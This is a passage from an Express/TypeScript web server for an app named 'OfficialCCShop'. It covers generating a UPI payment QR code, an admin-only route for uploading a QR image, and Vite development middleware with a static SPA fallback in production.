    const upiUri = `upi://pay?pa=${updated.upiId}&pn=${encodeURIComponent(updated.merchantName)}&cu=INR`;
    QRCode.toFile(DEFAULT_QR_PATH, upiUri, {
      width: 400,
      margin: 2,
      color: {
        dark: '#0f172a',
        light: '#ffffff',
      },
    }).catch((err) => console.error('Error updating QR file:', err));
  }

  db.logAudit(req.user!.id, 'ADMIN_SETTINGS_UPDATE', 'Updated deposit and QR payment configuration');
  res.json(updated);
});

// Upload custom QR image from admin
app.post('/api/admin/upload-qr', requireAdmin, upload.single('qrImage'), (req, res) => {
  if (!req.file) {
    return res.status(400).json({ error: 'No image file uploaded.' });
  }
  const uploadedPath = `/uploads/${req.file.filename}`;
  db.updatePaymentConfig({ qrImagePath: uploadedPath });
  res.json({
    message: 'QR image updated successfully.',
    qrImagePath: uploadedPath,
  });
});

// ----------------------------------------------------
// Vite Middleware & SPA Fallback
// ----------------------------------------------------
async function startServer() {
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`OfficialCCShop server running at http://0.0.0.0:${PORT}`);
  });
}

startServer();
